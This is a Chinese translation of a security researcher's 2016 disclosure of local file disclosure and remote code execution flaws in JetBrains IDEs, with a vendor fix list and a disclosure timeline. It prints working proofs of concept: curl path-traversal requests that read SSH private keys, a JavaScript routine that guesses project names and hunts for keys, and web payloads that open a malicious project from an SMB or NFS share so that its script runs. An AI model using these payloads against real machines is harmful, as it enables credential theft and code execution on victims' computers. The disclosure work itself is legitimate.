> 原文链接: https://www.anquanke.com//post/id/84410 


# JetBrains IDE 远程代码执行和本地文件泄露


                                阅读量   
                                **143672**
                            
                        |
                        
                                                                                    



##### 译文声明

本文是翻译文章，文章原作者，文章来源：saynotolinux
                                <br>原文地址：[http://blog.saynotolinux.com/blog/2016/08/15/jetbrains-ide-remote-code-execution-and-local-file-disclosure-vulnerability-analysis/](http://blog.saynotolinux.com/blog/2016/08/15/jetbrains-ide-remote-code-execution-and-local-file-disclosure-vulnerability-analysis/)

译文仅供参考，具体内容表达以及含义原文为准

[![](https://p0.ssl.qhimg.com/t0115b4ca42c8439cc8.png)](https://p0.ssl.qhimg.com/t0115b4ca42c8439cc8.png)  

至少从2013年开始，一直到2016年5月，JetBrains IDE就一直存在本地文件泄露问题，windows和osx版本还存在远程代码执行的问题。这种攻击的唯一前提就是受害者要在IDE启用时访问攻击者控制的网页。

受影响的IDE包括 PyCharm、Android Studio、WebStorm和IntelliJ IDEA 等。

我在2013年就对这些问题的核心部分进行过追踪（允许所有来源和长期启用的web服务器）。我相信从那时起，所有带有长期启用服务器的JetBrains IDE都易受到此类攻击。

影响windows和osx版本的远程代码执行漏洞是在2015年7月13日发现的，但是可能很早之前就已经通过其他手段实现了。

发现的所有问题都已经在2016年5月11日发布的修补程序中得到了解决。



**调查**

**<br>**

因为这些问题已经被修复，所以要想要进行调查就需要PyCharm 5.0.4版本，或者是PyCharm 2016.1的旧版本。很明显我们可以在VM中实现。

Linux: [https://download.jetbrains.com/python/pycharm-community-5.0.4.tar.gz](https://download.jetbrains.com/python/pycharm-community-5.0.4.tar.gz)

OS X:  [https://download.jetbrains.com/python/pycharm-community-5.0.4.dmg](https://download.jetbrains.com/python/pycharm-community-5.0.4.dmg)

Windows :[https://download.jetbrains.com/python/pycharm-community-5.0.4.exe](https://download.jetbrains.com/python/pycharm-community-5.0.4.exe)

<br>

**第一次发现**

**<br>**

开始的时候我只是在做协议开发研究工作，也一直在寻找有趣的目标。我想在我自己的设备上运行一些很有趣的服务，于是我运行了lsof -P -ITCP | grep LISTEN，想要看看有什么程序是被本地TCP端口监控的。



```
$ lsof -P -iTCP | grep LISTEN
# ...
pycharm   4177 user  289u  IPv4 0x81a02fb90b4eef47      0t0  TCP localhost:63342  (LISTEN)
```



我当时使用的IDE是PyCharm，但是一直都没有注意到它绑定到任何一个端口。可能是某种特设IPC机制？让我们来找出这些端口都发送了什么内容，遵循的都是什么协议：

<br>



```
$ nmap -A -p 63342 127.0.0.1
# [...]
PORT      STATE SERVICE VERSION
63342/tcp open  unknown
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at http://www.insecure.org/cgi-bin/servicefp-submit.cgi :
SF-Port63342-TCP:V=6.46%I=7%D=8/2%Time=57A0DD64%P=x86_64-apple-darwin13.1.
SF:0%r(GetRequest,173,"HTTP/1.1x20404x20Notx20Foundrncontent-type:x
# [...]
```



看起来像是一个HTTP服务器，这对于本地应用程序来说很不正常。让我们来看一下响应中用的是什么CORS标头：

<br>



```
$ curl -v -H "Origin: http://attacker.com/" "http://127.0.0.1:63342/"
&gt; GET / HTTP/1.1
&gt; Host: 127.0.0.1:63342
&gt; User-Agent: curl/7.43.0
&gt; Accept: */*
&gt; Origin: http://attacker.com/
&gt; 
&lt; HTTP/1.1 404 Not Found
[...]
&lt; access-control-allow-origin: http://attacker.com/
&lt; vary: origin
&lt; access-control-allow-credentials: true
&lt; access-control-allow-headers: authorization
&lt; access-control-allow-headers: origin
&lt; access-control-allow-headers: content-type
&lt; access-control-allow-headers: accept
&lt; 
* Connection #0 to host 127.0.0.1 left intact
&lt;!doctype html&gt;&lt;title&gt;404 Not Found&lt;/title&gt;&lt;h1 style="text-align: center"&gt;404 Not Found&lt;/h1&gt;&lt;hr/&gt;&lt;p style="text-align: center"&gt;PyCharm 5.0.4&lt;/p&gt;
```

这里有一些异常。PyCharm 的 HTTP 服务器的基本意思就是允许 web 页面上任何来源 （包括 http://attacker.com） 提出资质请求，并读取响应。那到底什么是HTTP服务器呢？它是否会含有敏感信息？如果任何页面都能读取它的内容我们该怎么办？<br>

<br>

**什么是HTTP服务器？**

**<br>**

在查找网页对应的端口号之后我们发现，服务器和Webstorm在2013年初新添加的新功能有关。功能理念就是用户不需要设置自己的web服务器在浏览器中预览网页，只要在Webstorm中单击“在浏览器中查看”这个按钮就可以在http://localhost:63342/&lt;projectname&gt;/&lt;your_file.html&gt;中进行查看。其中包含的任何脚本或者页面都可以通过类似的链接（http://localhost:63342/&lt;projectname&gt;/some_script.js）呈现。

要验证 PyCharm 嵌入的服务器是否与 WebStorm 类似，让我们在 PyCharm创建一个名为"测试" 的项目，并在根目录中创建一个名为"something.txt"的文件。



```
$ curl -v -H "Origin: http://attacker.com/" "http://127.0.0.1:63342/testing/something.txt"
&gt; GET /testing/something.txt HTTP/1.1
&gt; Host: 127.0.0.1:63342
&gt; User-Agent: curl/7.43.0
&gt; Accept: */*
&gt; Origin: http://attacker.com/
&gt; 
&lt; HTTP/1.1 200 OK
[...]
&lt; access-control-allow-origin: http://attacker.com/
[...]
these are the file contents!
```

所以我们发现，所有的站点只要能猜到项目名称和文件名，就可以读取任何项目文件。很显然这其中将包括任何配置文件包，其中会含有AWS密钥等敏感信息。这里就是一个HTML片段：



```
&lt;script&gt;
var xhr = new XMLHttpRequest();
xhr.open("GET", "http://localhost:63342/testing/something.txt", true);
xhr.onload = function() `{`alert(xhr.responseText)`}`;
xhr.send();
&lt;/script&gt;
```



**武器化——从项目目录中逃逸**

我们先看一下是否可以读取项目目录以外的文件，比如说SSH密钥。最明显的就是看一下它是如何处理URI请求的：



```
$ curl -v "http://localhost:63342/testing/../../../.ssh/id_rsa"
* Rebuilt URL to: http://localhost:63342/.ssh/id_rsa
```

[](http://localhost:63342/.ssh/id_rsa)

可以看出每段路径都必须由客户端或是服务器进行规范化处理。幸运的是，PyCharm 的内部 HTTP 服务器使用的是%2F..%2F这样的点段。



```
$ curl -v "http://localhost:63342/testing/..%2f..%2f.ssh/id_rsa"
&gt; GET /testing/..%2f..%2f.ssh/id_rsa HTTP/1.1
[...]
&gt; 
&lt; HTTP/1.1 200 OK
&lt; content-type: application/octet-stream
&lt; server: PyCharm 5.0.4
[...]
&lt; 
ssh-rsa AAAAB3NzaC[...]
```



接下来唯一的限制就是必须要知道受害者的项目名称。最明显的选择就是使用词典中存在的潜在项目名（用户可能已经打开），并尝试请求/&lt;potential_projectname&gt;/.idea/workspace.xml。



```
$ curl --head "http://localhost:63342/testing/.idea/workspace.xml"
HTTP/1.1 200 OK
$ curl --head "http://localhost:63342/somethingelse/.idea/workspace.xml"
HTTP/1.1 404 Not Found
```

下面是JavaScript中一个原始的PoC：



```
function findLoadedProject(cb) `{`
  var xhr = new XMLHttpRequest();
  // Let's assume we have a sensible dictionary here.
  var possibleProjectNames = ["foobar", "testing", "bazquux"];
  var tryNextProject = function() `{`
    if (!possibleProjectNames.length) `{`
      cb(null);
      return;
    `}`
    var projectName = possibleProjectNames.pop();
    xhr.open("GET", "http://localhost:63342/" + projectName + "/.idea/workspace.xml", true);
    xhr.onload = function() `{`
      if(xhr.status === 200) `{`
        cb(projectName);
      `}` else `{`
        tryNextProject();
      `}`
    `}`;
    xhr.send();
  `}`;
`}`
 
var findSSHKeys = function(projectName) `{`
  var xhr = new XMLHttpRequest();
  var depth = 0;
  var tryNextDepth = function() `{`
    // No luck, SSH directory doesn't share a parent
    // directory with the project.
    if(++depth &gt; 15) `{`
      return;
    `}`
    // Chances are that both `.ssh` and the project directory are under the user's home folder,
    // let's try to walk up the dir tree.
    dotSegs = "..%2f".repeat(depth);
    xhr.open("GET", "http://localhost:63342/" + projectName + "/" + dotSegs + ".ssh/id_rsa.pub", true);
    xhr.onload = function() `{`
      if (xhr.status === 200) `{`
        console.log(xhr.responseText);
      `}` else `{`
        tryNextDepth();
      `}`
    `}`;
    xhr.send();
  `}`
`}`;
 
findLoadedProject(function(projectName) `{`
  if(projectName) `{`
    console.log(projectName, "is a valid project, looking for SSH key");
    findSSHKeys(projectName);
  `}` else `{`
    console.log("Failed to guess a project name");
  `}`
`}`);
```



<br>

**可以避开项目名称猜测吗？**

必须要猜测出准确的项目名称这一点大大的缓冲了文件泄露的灾害性，但是API可能会解决这一问题。

最后我发现了JetBrainsProtocolHandlerHttpService对应的/api/internal 端口。显然这个端口可以在JSON blob中传送一个含有jetbrains: 的URL。

  / / &lt;project_name&gt; /open/ &lt;path&gt;处理程序似乎可以发现一些问题：



```
public class JBProtocolOpenProjectCommand extends JBProtocolCommand `{`
  public JBProtocolOpenProjectCommand() `{`
    super("open");
  `}`
 
  @Override
  public void perform(String target, Map&lt;String, String&gt; parameters) `{`
    String path = URLDecoder.decode(target);
    path = StringUtil.trimStart(path, LocalFileSystem.PROTOCOL_PREFIX);
    ProjectUtil.openProject(path, null, true);
  `}`
`}`
```



这让我们可以通过绝对路径打开一个项目，大多数 * NIX 系统

都有/Etc 目录，我们尝试打开一下：

```
$ curl "http://127.0.0.1:63342/api/internal" --data '`{`"url": "jetbrains://whatever/open//etc"`}`'
```



[![](https://p5.ssl.qhimg.com/t012951b5e317684e5c.png)](https://p5.ssl.qhimg.com/t012951b5e317684e5c.png)

所以该目录需要确实包含一个JetBrains风格的项目，不能简单地忽略任何旧目录。在OSX版本中，这会在/Applications/PyCharm.app/Contents/helpers下面，我们来试一下：

```
$ curl -v "http://127.0.0.1:63342/api/internal" --data '`{`"url": "jetbrains://whatever/open//Applications/PyCharm.app/Contents/helpers"`}`'
```



[![](https://p1.ssl.qhimg.com/t010dade6db1b54cec2.png)](https://p1.ssl.qhimg.com/t010dade6db1b54cec2.png)

只要我们确保现在项目是打开的状态，就不必再猜测项目名称了。在Linux中PyCharm 的根文件夹没有标准位置，但我们可以发出/api/about?more=true请求来确定：



```
`{`
  "name": "PyCharm 2016.1.2",
  "productName": "PyCharm",
  "baselineVersion": 145,
  "buildNumber": 844,
  "vendor": "JetBrains s.r.o.",
  "isEAP": false,
  "productCode": "PY",
  "buildDate": 1460098800000,
  "isSnapshot": false,
  "configPath": "/home/user/.PyCharm2016.1/config",
  "systemPath": "/home/user/.PyCharm2016.1/system",
  "binPath": "/home/user/opt/pycharm/bin",
  "logPath": "/home/user/.PyCharm2016.1/system/log",
  "homePath": "/home/user/opt/pycharm"
`}`
```



一旦我们打开 helpers项目，就可以从/api/about?more=true响应中确定用户的本地目录，然后用来构建一个访问SSH密钥的URL，就像这样/helpers/..%2f..%2f..%2f..%2f..%2f..%2fhome/&lt;user&gt;/.ssh/id_rsa：



```
$ curl -v "http://localhost:63342/helpers/..%2f..%2f..%2f..%2f..%2f..%2fhome/user/.ssh/id_rsa"
&gt; GET /helpers/..%2f..%2f..%2f..%2f..%2f..%2fhome/user/.ssh/id_rsa HTTP/1.1
[...]
&gt; 
&lt; HTTP/1.1 200 OK
&lt; content-type: application/octet-stream
&lt; server: PyCharm 5.0.4
[...]
&lt; 
ssh-rsa AAAAB3NzaC[...]
```



**WINDOWS****环境下攻击更加容易**

上述用来打开 helpers目录的技巧只有在用户已经安装PyCharm 2016.1 的前提下成立，其他情况下还是需要猜测出项目名称。那么其他的JetBrains IDE（比如IntelliJ IDEA和Android Studio）工作情况怎么样呢？

  由于jetbrains://project/open处理程序允许我们通过任何路径传递项目，UNC路径又是一个很方便的选择。UNC 路径是 windows 的特定路径，允许用户在网络共享中引用文件。（类似于\servernamesharenamefilepath）。多数的windows文件API会很乐于选择UNC路径并且光明正大地连接到另一台电脑的SMB共享，这样就可以读取和写入远程文件。如果可以获得从SMB共享中打开项目的IDE，我们就不需要猜测受害者电脑上的项目名称了。

  出于测试的目的，我设置了一个远程的Samba示例，其中有未经身份验证的SMB共享（名叫anontesting），共享中有一个 JetBrains 项目，我们现在来尝试打开：

```
$ curl -v "http://127.0.0.1:63342/api/internal" --data '`{`"url": "jetbrains://whatever/open/\\smb.example.com\anonshare\testing"`}`'
```



  我们假定受害者的ISP不会阻止SMB出站通信，我们就可以从SMB共享中加载任意项目。

<br>

**Windows****下还有更糟的后果**

我们似乎可以做一些更加有趣的事情，可以通过一个请求使得windows用户从我们的远程SMB共享中下载一个用做攻击的项目。

JetBrains 的IDE每一个项目都有一个启动任务的概念。在PyCharm中，项目加载时会自动运行Python脚本，这就相当于在Android Studio和IntelliJ IDEA 中运行.jar。在下面的示例中，我已经完成了这一点，当项目打开时将会在项目根目录中自动运行hax.py 脚本：

[![](https://p0.ssl.qhimg.com/t015c106d74229bae2f.png)](https://p0.ssl.qhimg.com/t015c106d74229bae2f.png)

[![](https://p1.ssl.qhimg.com/t019f08420c6dd09a1c.png)](https://p1.ssl.qhimg.com/t019f08420c6dd09a1c.png)





现在我们需要在项目根目录中添加一个hax.py文件：



```
import os
 
os.system("calc.exe")
```

我们将该项目放在匿名SMB共享中，然后我们会呈现给受害者加载恶意项目的页面：



```
&lt;script&gt;
var xhr = new XMLHttpRequest();
xhr.open("POST", "http://127.0.0.1:63342/api/internal", true);
xhr.send('`{`"url": "jetbrains://whatever/open/\\\\123.456.789.101\\anonshare\\testing"`}`');
&lt;/script&gt;
```



只要受害者导航到该页面，我们的有效荷载和计算器就会被触发：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t01febdfc2b6398e472.jpg)



**OSX****也难逃魔爪**

**<br>**

在这片文章最初发表之后，纽约商品交易所（COMEX）指出，OSX会在用户通过 /net autofs 挂载点访问时自动安装远程 NFS 共享。这就意味着利用OSX下的RCE就类似于利用WINDOWS下的IDE。我们创建一个匿名NFS共享并打开/net/&lt;hostname&gt;/&lt;sharename&gt;/&lt;projectname&gt;：

```
$ curl -v "http://127.0.0.1:63342/api/internal" --data '`{`"url": "jetbrains://whatever/open//net/nfs.example.com/anonshare/testing"`}`'
```



在HTML PoC看到了这个：



```
&lt;script&gt;
var xhr = new XMLHttpRequest();
xhr.open("POST", "http://127.0.0.1:63342/api/internal", true);
xhr.send('`{`"url": "jetbrains://whatever/open//net/nfs.example.com/anonshare/testing"`}`');
&lt;/script&gt;
```



这可能适用于所有使用-hosts的* NIX 式 autofs 挂载点，但是OS X 是我能找到的在默认安装中这样配置autofs的唯一操作系统。

[![](https://p0.ssl.qhimg.com/t0115b4ca42c8439cc8.png)](https://p0.ssl.qhimg.com/t0115b4ca42c8439cc8.png)



**<br>**

**PoC**

· 最小化文件泄露PoC

· Weaponized 文件泄漏 PoC

· WINDOWS和OSX的RCE中没有PoC

<br>

**修复**

· 下面是我知道的JetBrains做出的几点修复措施：

· 发送给本地HTTP服务器的所有请求都需要一个陌生的身份验证包，否则服务器会返回4xx状态代码。

· 疑难CORS策略被完全删除。

· 现在需要验证host标头值，以防止类似漏洞。

<br>

**供应商反响——与供应商的交流**

在这里要感谢Hadi Hariri 及其团队对于我报告的主动回应。在我发出电子邮件后的一小时就收到了回复。

他们发送了补丁给我，以及他们解决方案的二进制构建，并且也接受我在反馈中提到的潜在问题。

<br>

**披露时间轴**



•2016-04-04：发现本地文件泄露问题

•2016-04-06：向供应商提出安全接触请求

•2016-04-06：供应商回复安全联系信息，请求漏洞详细信息

•2016-04-07：向供应商发送本地文件泄漏漏洞的 PoC

•2016-04-10：向供应商发送关于RCE 的补救步骤和细节的更详细报告

•2016-04-12：供应商做出响应，表示他们正在修补程序

•2016-04-14：供应商在响应中提供了针对开源intellij-community的修补程序

•2016-04-14：发送修补程序修改意见给供应商

•2016-04-15：供应商做出响应，表示他们正在更新修补程序

•2016-04-26：供应商表示，他们打算近期发布补丁

•2016-05-11：发布针对所有JetBrains IDE的安全修补程序


